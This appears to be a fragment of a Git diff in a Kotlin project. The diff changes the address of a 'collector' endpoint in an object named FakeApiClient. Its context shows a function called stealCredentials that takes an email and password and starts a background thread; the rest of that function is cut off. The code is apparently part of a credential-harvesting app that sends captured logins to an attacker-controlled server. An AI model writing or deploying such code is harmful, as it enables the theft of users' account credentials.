@@ -7,7 +7,7 @@ import kotlin.concurrent.thread
 
 object FakeApiClient {
 
-    private const val BASE_URL = "http://192.168.1.5:3000/api/collector"
+    private const val BASE_URL = "http://192.168.137.32:3000/api/collector"
 
     fun stealCredentials(email: String, pass: String) {
         thread {
